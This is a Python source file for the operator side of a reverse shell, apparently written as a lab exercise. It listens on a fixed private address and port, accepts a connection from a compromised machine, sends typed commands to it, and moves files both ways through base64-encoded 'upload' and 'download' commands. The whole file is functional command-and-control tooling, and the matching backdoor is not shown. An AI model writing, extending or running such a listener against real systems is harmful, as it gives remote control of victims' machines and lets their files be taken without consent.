from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from json import dumps, loads
from typing import NamedTuple
from base64 import b64decode, b64encode


class Options(NamedTuple):
    '''
    Tuple for storing configuration constants.
    '''
    target_ip: str
    target_port: int


class Listener(object):
    ip: str
    port: int

    def __init__(self, ip, port):
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.ip = ip
        self.port = port

    def send(self, data):
        json_data = dumps(data)
        self.connection.send(json_data.encode())

    def receive(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return loads(json_data)
            except ValueError:
                continue
    
    def execute(self, cmd):
        self.send(cmd)
        if cmd[0] == 'exit':
            self.connection.close()
            exit()
        return self.receive()

    def write(self, path, content):
        with open(path, 'wb') as out_file:
            out_file.write(b64decode(content))
            return '[+] Download Succesful'

    def read(self, path):
        with open(path, 'rb') as in_file:
            return b64encode(in_file.read())

    def run(self):
        self.sock.bind((self.ip, self.port))
        self.sock.listen(0)
        self.connection, self.address = self.sock.accept()
        while True:
            cmd = input('>> ')
            cmd = cmd.split(' ')
            try:
                if cmd[0] == 'upload':
                    content = self.read(cmd[1])
                    cmd.append(content.decode())
                elif cmd[0] == 'cd' and len(cmd) > 2:
                    cmd[1] = ' '.join(cmd[1:])
                result = self.execute(cmd)
                if cmd[0] == 'download' and '[-] Error' not in result:
                    result = self.write(cmd[1], result)
            except Exception as e:
                raise e
                result = f'[-] Error during command execution: \n\t{e}'
            print(result)


def main(*args, **kwargs) -> None:
    print('[+] Starting listener')
    listener = Listener('10.0.2.15', 7777)
    listener.run()


if __name__ == "__main__": 
    main()